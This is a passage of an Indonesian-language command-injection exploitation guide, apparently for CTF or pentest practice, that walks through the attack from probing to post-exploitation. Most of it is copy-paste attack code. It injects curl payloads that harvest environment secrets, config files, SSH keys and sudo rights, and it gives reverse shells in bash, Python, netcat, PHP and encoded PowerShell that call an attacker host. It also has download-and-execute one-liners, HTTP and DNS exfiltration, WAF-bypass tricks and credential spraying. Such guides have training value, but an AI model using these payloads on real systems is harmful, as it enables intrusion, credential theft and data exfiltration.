SEP=" && "  # ganti dengan working separator

# Test 1: WHO AM I?
echo "=== IDENTITY ==="
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}id"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}whoami"

# Test 2: WHERE AM I?
echo "=== LOCATION ==="
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}pwd"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}hostname"

# Test 3: WHAT OS?
echo "=== OS INFO ==="
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}uname -a"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}cat /etc/os-release"

# Test 4: WHAT NETWORK?
echo "=== NETWORK ==="
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}ip a"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}ip route"
```

**OUTPUT BERHASIL ✅ — Linux target:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
/var/www/html
web01
Linux web01 5.15.0-88-generic x86_64 GNU/Linux
```

➡️ **Linux target**, running sebagai `www-data`  
➡️ Catat info ini, penting untuk Fase 3 (privilege escalation later)

**OUTPUT BERHASIL ✅ — Windows target:**

text

```
nt authority\iis apppool\defaultapppool
C:\inetpub\wwwroot
web01
Windows Server 2019 Standard 10.0.17763
```

➡️ **Windows target** → Ganti ke Windows commands (`dir`, `type`, `whoami /priv`)  
➡️ Ke **Langkah 2.1W — Windows Path**

---

### Langkah 2.2 — Credential & Config Hunting

Bash

```
SEP=" && "  # sesuaikan

# Credentials di environment variables (SERING ADA DI CTF!)
echo "=== ENV VARS (Credentials Hunt) ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}env" | \
     grep -iE "pass|key|secret|token|db|database|api"

# Web config files (PALING SERING MENGANDUNG CREDENTIALS)
echo "=== CONFIG FILES ==="
for config in /var/www/html/config.php /var/www/html/.env /var/www/html/wp-config.php \
              /var/www/html/config/database.php /opt/app/config.py /app/.env; do
    RESULT=$(curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}cat $config 2>/dev/null")
    if echo "$RESULT" | grep -qiE "password|DB_PASS|secret"; then
        echo "[FOUND CONFIG] $config"
        echo "$RESULT" | grep -iE "pass|key|secret|token" | head -10
    fi
done

# SSH keys
echo "=== SSH KEYS ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}find /home /root -name 'id_rsa' 2>/dev/null"

# /etc/passwd dan shadow
echo "=== USERS ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}cat /etc/passwd | grep -v nologin | grep -v false"

# Sudo permissions
echo "=== SUDO ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}sudo -l 2>/dev/null"

# SUID binaries (potensial privesc)
echo "=== SUID ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}find / -perm -4000 2>/dev/null | head -20"
```

**OUTPUT BERHASIL ✅ — Menemukan credentials di .env:**

text

```
[FOUND CONFIG] /var/www/html/.env
DB_PASSWORD=S3cur3DB@2024
APP_KEY=base64:abc123...
MAIL_PASSWORD=smtp_password
```

➡️ **SIMPAN CREDENTIALS:**

Bash

```
echo "DB:S3cur3DB@2024" >> ~/cmdi_loot/creds/found_creds.txt
echo "APP_KEY:base64:abc123" >> ~/cmdi_loot/creds/found_creds.txt

# Test credentials ke semua service
nxc ssh $TARGET -u www-data -p 'S3cur3DB@2024'
nxc smb $TARGET -u www-data -p 'S3cur3DB@2024'
# → Ke workflow service yang relevan
```

**OUTPUT BERHASIL ✅ — Sudo permission ditemukan:**

text

```
User www-data may run the following commands on web01:
    (root) NOPASSWD: /usr/bin/python3
```

➡️ **JACKPOT!** www-data bisa run python3 sebagai root!  
➡️ Langsung ke **Langkah 2.4 — Quick Root via Sudo**

**OUTPUT BERHASIL ✅ — SUID menarik:**

text

```
/usr/bin/find
/usr/bin/vim
/usr/local/bin/custom_binary
```

➡️ Catat untuk privilege escalation via **[🐧 47 — Sudo, SUID & Capabilities Workflow](/docs/sudo-suid-capabilities)**

---

### Langkah 2.3 — Network Enumeration (Pivot Planning)

Bash

```
SEP=" && "

# Internal services yang listening
echo "=== INTERNAL SERVICES ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}ss -tunlp 2>/dev/null | head -30"

# ARP table (target lain di network yang sama)
echo "=== ARP / NEIGHBORS ==="
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}arp -n 2>/dev/null"
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}cat /proc/net/arp"

# Route table (network segments)
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}ip route"

# Internal hosts dari /etc/hosts
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}cat /etc/hosts"
```

**OUTPUT BERHASIL ✅ — Internal network ditemukan:**

text

```
10.0.0.1 dev eth0 proto kernel scope link
172.16.0.0/24 dev docker0 proto kernel scope link
192.168.1.0/24 via 10.0.0.1 dev eth0

# /etc/hosts
10.0.0.5    db-server
10.0.0.10   internal-web
172.16.0.2  docker-registry
```

➡️ **Ada network internal!** Simpan untuk pivoting:

Bash

```
echo "DB_SERVER:10.0.0.5" >> ~/cmdi_loot/creds/network_map.txt
echo "INTERNAL_WEB:10.0.0.10" >> ~/cmdi_loot/creds/network_map.txt
# → Ke <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a> setelah dapat shell
```

---

### Langkah 2.4 — Quick Root via Sudo (Jika Sudo Terdeteksi)

Bash

```
SEP=" && "

# Jika sudo python3 → spawn root shell langsung
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}sudo python3 -c 'import os; os.system(\"id\")';"

# Jika sudo find → bisa eksekusi command
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}sudo find / -name test -exec id \;"

# Jika sudo vim/vi → bisa escape ke shell
# (Ini butuh interactive shell, jadi langsung ke reverse shell dulu)
```

**OUTPUT BERHASIL ✅ — Root execution:**

text

```
uid=0(root) gid=0(root) groups=0(root)
```

➡️ **BISA ROOT!** Setup reverse shell sebagai root → ke **Fase 3**

---

## ═══════════════════════════════════════

## FASE 3: REVERSE SHELL

## ═══════════════════════════════════════

> **Setup listener DULU sebelum trigger!**

### Langkah 3.1 — Persiapan Listener

Bash

```
# Terminal 1: Setup listener
# Method A: nc biasa
nc -lvnp $LPORT

# Method B: dengan rlwrap (lebih nyaman)
rlwrap nc -lvnp $LPORT

# Method C: socat (langsung stable shell)
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT
```

### Langkah 3.2 — Cek Tool yang Tersedia di Target

Bash

```
SEP=" && "

# Cek binary yang tersedia untuk reverse shell
echo "=== AVAILABLE TOOLS ==="
for tool in bash nc netcat python python3 perl php ruby socat curl wget; do
    RESULT=$(curl -sG "$VULN_URL" \
        --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}which $tool 2>/dev/null")
    if echo "$RESULT" | grep -q "/$tool"; then
        echo "[✅ AVAILABLE] $tool: $(echo $RESULT | grep -o '/[^ ]*')"
    else
        echo "[❌] $tool: not found"
    fi
done
```

**OUTPUT BERHASIL ✅ — Tools tersedia:**

text

```
[✅ AVAILABLE] bash: /bin/bash
[❌] nc: not found
[❌] netcat: not found
[✅ AVAILABLE] python3: /usr/bin/python3
[❌] perl: not found
[✅ AVAILABLE] curl: /usr/bin/curl
```

➡️ `nc` tidak ada tapi `python3` ada → gunakan Python reverse shell

---

### Langkah 3.3 — Launch Reverse Shell (Pilih Sesuai Tools Tersedia)

Bash

```
SEP=" && "
LHOST="10.10.14.5"
LPORT="4444"

# ===================================================
# METHOD 1: Bash TCP (jika bash ada)
# ===================================================
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

# ===================================================
# METHOD 2: Python3 (jika bash TCP tidak work)
# ===================================================
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

# ===================================================
# METHOD 3: Netcat (jika nc ada dengan -e flag)
# ===================================================
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}nc $LHOST $LPORT -e /bin/bash"

# ===================================================
# METHOD 4: Netcat FIFO (jika nc ada tapi tidak ada -e)
# ===================================================
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc $LHOST $LPORT>/tmp/p"

# ===================================================
# METHOD 5: PHP (jika target PHP dan php binary ada)
# ===================================================
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"

# ===================================================
# METHOD 6: Via script yang dihosting (paling clean)
# ===================================================
# Buat script dulu di attacker:
cat > /tmp/revshell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
# Serve via http
python3 -m http.server 8080 -d /tmp &

# Trigger download dan execute di target
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}curl http://$LHOST:8080/revshell.sh|bash"
```

**OUTPUT BERHASIL ✅ — Shell diterima di listener:**

text

```
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 54321
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **REVERSE SHELL DIDAPAT!** Segera stabilize!

**OUTPUT GAGAL ❌ — Tidak ada koneksi masuk:**

text

```
(listener tetap waiting)
```

➡️ Kemungkinan **outbound firewall**. Test konektivitas:

Bash

```
# Test apakah target bisa outbound ke kita
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}curl -s http://$LHOST:8000/test"
# Setup server dulu: python3 -m http.server 8000

# Jika tidak bisa → coba port 80, 443, 53
export LPORT=443
sudo nc -lvnp 443  # butuh sudo untuk port < 1024
```

➡️ Jika semua outbound diblokir → gunakan **OOB exfiltration** untuk baca flag

---

### Langkah 3.4 — Shell Stabilization (LANGSUNG LAKUKAN INI!)

Bash

```
# Di dalam reverse shell yang baru diterima:

# Step 1: Upgrade ke PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Jika python3 tidak ada:
python -c 'import pty; pty.spawn("/bin/bash")'
# Jika python tidak ada:
script /dev/null -c bash

# Step 2: Background nc dan set raw mode (di terminal attacker)
# Tekan: Ctrl+Z
# Lalu di attacker terminal:
stty raw -echo; fg
# Tekan Enter 2x

# Step 3: Set terminal environment (di shell target)
export TERM=xterm
stty rows 50 cols 220
export SHELL=/bin/bash

# Verify stabilisasi:
tty        # harus: /dev/pts/X
echo $TERM # harus: xterm
```

**OUTPUT BERHASIL ✅ — Shell stable:**

text

```
/dev/pts/0
xterm
www-data@web01:/var/www/html$
```

➡️ Shell fully interactive! Tab completion, Ctrl+C, arrow keys semua bekerja  
➡️ Lanjut ke **Fase 4 — Post Exploitation**

---

## ═══════════════════════════════════════

## FASE 4: POST EXPLOITATION

## ═══════════════════════════════════════

### Langkah 4.1 — Comprehensive Enumeration dari Shell

Bash

```
# Dari dalam shell (bukan webshell)

# Identity lengkap
id; whoami; hostname; uname -a

# Network full
ip a; ip route; ss -tunlp
cat /etc/hosts

# Proses berjalan (cari credential di arguments)
ps aux | grep -iE "password|secret|key|token"

# Environment variables
env | grep -iE "pass|key|secret|token|db"

# File menarik
find / -name "*.conf" -readable 2>/dev/null | head -20
find / -name ".env" -readable 2>/dev/null
find / -name "id_rsa" -readable 2>/dev/null
find / -perm -4000 2>/dev/null  # SUID
sudo -l 2>/dev/null
```

### Langkah 4.2 — Cross-Service Credential Testing

Setiap credentials yang ditemukan dari command injection:

text

```
Command Injection Creds Found
         │
         ├─ ─→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
         ├──→ Port 21  (FTP)     → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
         ├──→ Port 445 (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
         ├──→ Port 3306 (MySQL)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
         ├──→ Port 5432 (Postgres)→ <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
         ├──→ Port 5985 (WinRM)  → evil-winrm
         └──→ Privilege Escalation → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

Bash

```
# Test credentials yang ditemukan ke semua service
export FOUND_USER="www-data"
export FOUND_PASS="S3cur3DB@2024"

nxc ssh $TARGET -u "$FOUND_USER" -p "$FOUND_PASS"
nxc smb $TARGET -u "$FOUND_USER" -p "$FOUND_PASS"
nxc mysql $TARGET -u "$FOUND_USER" -p "$FOUND_PASS"
```

---

## ═══════════════════════════════════════

## FASE 5: WINDOWS COMMAND INJECTION PATH

## ═══════════════════════════════════════

> Masuk sini jika target adalah **Windows** (terdeteksi dari `whoami` output `NT AUTHORITY\...`)

### Langkah 5.1 — Windows Separator & Command Test

Bash

```
# Windows separators yang berbeda dari Linux
for sep in ' & ' ' && ' ' | ' ' || '; do
    RESPONSE=$(curl -sG "$VULN_URL" \
        --data-urlencode "${VULN_PARAM}=127.0.0.1${sep}whoami" \
        --max-time 10)
    
    if echo "$RESPONSE" | grep -qiE "nt authority|administrator|iis"; then
        echo "[✅ WIN VULNERABLE] Separator: [$sep]"
        echo "$RESPONSE" | grep -iE "authority|administrator|system|iis"
    fi
done
```

**OUTPUT BERHASIL ✅ — Windows injection:**

text

```
[✅ WIN VULNERABLE] Separator: [ & ]
nt authority\iis apppool\defaultapppool
```

### Langkah 5.2 — Windows Information Gathering

Bash

```
SEP=" & "

# Windows system info
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}whoami /all"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}systeminfo | findstr /B /C:\"OS\""
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}ipconfig /all"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}dir C:\\"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}type C:\\Users\\Administrator\\Desktop\\flag.txt"
```

### Langkah 5.3 — Windows Reverse Shell

Bash

```
SEP=" & "
LHOST="10.10.14.5"
LPORT="4444"

# Setup Windows listener (di attacker)
rlwrap nc -lvnp $LPORT

# Method 1: PowerShell TCP reverse shell
PSSHELL='$c=New-Object Net.Sockets.TCPClient("'$LHOST'",'$LPORT');$s=$c.GetStream();[byte[]]$b=0..65535;while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$o=$r+"PS "+(pwd).Path+"> ";$x=[Text.Encoding]::ASCII.GetBytes($o);$s.Write($x,0,$x.Length)}'

curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}powershell -NoP -NonI -W Hidden -Enc $(echo -n "$PSSHELL" | iconv -t UTF-16LE | base64 -w 0)"

# Method 2: Download dan eksekusi via PowerShell
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8080/Invoke-PowerShellTcp.ps1')\""
```

---

## ═══════════════════════════════════════

## FASE 6: OOB DATA EXFILTRATION (Blind Injection Only)

## ═══════════════════════════════════════

> Gunakan jika: blind injection confirmed tapi tidak bisa dapat interactive shell (firewall outbound ketat)

### Langkah 6.1 — Exfiltrate Data via HTTP

Bash

```
# Setup HTTP listener di attacker
python3 -m http.server 8000 &

SEP=";"

# Exfiltrate command output via HTTP (base64 encoded)
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}curl -s \"http://$LHOST:8000/?\$(id | base64 -w0)\""

# Decode di attacker side (dari HTTP server log)
# "GET /?dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzM..." → decode:
echo "dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzM..." | base64 -d

# Exfiltrate file (misal: flag atau config)
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}curl -s \"http://$LHOST:8000/?\$(cat /flag.txt | base64 -w0)\""

# Exfiltrate via DNS (jika HTTP diblokir)
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}nslookup \$(id | base64 -w0 | head -c 50).$OOB_DOMAIN"
```

**OUTPUT BERHASIL ✅ — Data ter-exfiltrate:**

text

```
# Di HTTP server log:
10.10.11.200 - - "GET /?dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzM= HTTP/1.1" 200
# Decode:
uid=33(www-data) gid=33(www-data)
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|Semua separator tidak return uid=|Blind injection|Test sleep timing, lalu OOB|
|sleep timing tidak konsisten|Network latency|Gunakan 3+ samples, compare median|
|`sh: syntax error near token ';'`|Shell memproses input|**Ini BAGUS!** Shell ada, coba separator lain|
|Output kosong meski separator diterima|stdout tidak di-forward|Coba `2>&1` atau redirect ke file|
|`permission denied` di beberapa command|www-data privilege|Enumerate sudo/SUID|
|Reverse shell connect tapi langsung disconnect|Shell crash|Stabilize dengan pty, coba method lain|
|OOB DNS tidak sampai|Egress DNS diblokir|Coba HTTP OOB atau timing|
|`nc: command not found`|Minimal system|Gunakan Python/PHP/Perl reverse shell|
|WAF block dengan 403|WAF ada|Test space bypass, IFS, hex encoding|
|`;` diblokir|Separator blacklist|Coba `&&`, `\|`, newline, backtick|
|Semua command tidak ada output|Output blind + no outbound|Write ke file lalu baca via LFI|
|Windows: `ls` tidak bekerja|Wrong command family|Gunakan `dir` untuk list, `type` untuk baca|
|Python reverse shell tidak connect|Python version issue|Coba `python` bukan `python3`|
|reverse shell: `bash: /dev/tcp: No such file`|Non-bash shell|Ganti ke nc atau python method|
|Command truncated|Length limit|Gunakan command pendek atau write script ke /tmp|
|`sudo -l` minta password|Non-passwordless sudo|Cek SUID sebagai alternative privesc|
|Outbound ke 4444 diblokir|Firewall egress|Coba port 80, 443, 53|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Feature Mencurigakan Ditemukan (ping/nslookup/convert/etc)
│
├─ FASE 0: Baseline & Recon
│   ├─ Identifikasi parameter vulnerable
│   └─ Ukur baseline response & timing
│
├─ FASE 1: Probe Injection Point
│   ├─ [uid= terlihat di response]     → IN-BAND confirmed → FASE 2
│   ├─ [timing delay 5s+ konsisten]    → BLIND confirmed → Fase 1.3 (OOB)
│   ├─ [403/blocked]                   → Filter/WAF → Fase 1.4 (Bypass)
│   └─ [sh: syntax error di response] → KUAT! Shell ada, coba separator lain
│
├─ FASE 2: Information Gathering
│   ├─ [sudo python/find/vim]           → Quick root! → Langkah 2.4
│   ├─ [Credentials di env/.env/config] → Save + cross-service test
│   ├─ [SSH key ditemukan]              → Ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
│   └─ [Internal network terdeteksi]    → Note untuk pivot
│
├─ FASE 3: Reverse Shell
│   ├─ [bash available]  → bash -i >& /dev/tcp/LHOST/LPORT 0>&1
│   ├─ [python3 available] → python socket reverse shell
│   ├─ [nc with -e]       → nc LHOST LPORT -e /bin/bash
│   ├─ [nc without -e]    → mkfifo FIFO method
│   └─ [outbound blocked] → OOB exfiltration → FASE 6
│
├─ FASE 4: Post Exploitation
│   ├─ [www-data] → sudo -l, SUID → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
│   ├─ [Windows]  → whoami /priv → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
│   └─ [Creds found] → Cross-service testing
│
└─ FASE 5/6: Windows Path / OOB Exfiltration
    └─ Sesuai OS dan availability
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"; export LPORT="4444"
export VULN_URL="http://$TARGET/ping"; export VULN_PARAM="host"
export SEP=" && "  # ganti sesuai hasil test

# === QUICK SEPARATOR TEST ===
for sep in ';' ' & ' ' && ' ' | ' ' || ' '%0a'; do
    R=$(curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${sep}id" --max-time 8)
    echo "$R" | grep -q "uid=" && echo "[✅] $sep" || echo "[❌] $sep"
done

# === BLIND TIMING TEST ===
curl -o /dev/null -s -w "Time: %{time_total}\n" -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}sleep 5"

# === INFO GATHERING ===
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}id"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}uname -a"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}env | grep -iE 'pass|key|secret'"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}sudo -l"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}find / -perm -4000 2>/dev/null"

# === REVERSE SHELL ===
# Listener dulu!: rlwrap nc -lvnp $LPORT
# Bash:
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
# Python3:
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"

# === SHELL STABILIZE (di dalam reverse shell) ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [Ctrl+Z] → stty raw -echo; fg → export TERM=xterm; stty rows 50 cols 220

# === FILTER BYPASS ===
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1;cat\${IFS}/etc/passwd"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1;\$(printf '\151\144')"
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1;a=i;b=d;\$a\$b"

# === OOB EXFIL ===
# Setup server: python3 -m http.server 8000
curl -sG "$VULN_URL" --data-urlencode "${VULN_PARAM}=127.0.0.1${SEP}curl \"http://$LHOST:8000/?\$(id|base64 -w0)\""
```

---

> **➡️ NEXT:** Setelah command injection memberikan shell, lanjut ke **`[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)`** (Linux) atau **`[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)`** (Windows) untuk privilege escalation. Jika menemukan credentials dari config file, test ke semua service via **`[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)`** dan **`[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)`**. Jika ada internal network yang terdeteksi, siapkan **`[⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)](/docs/pivoting-tunneling)`**.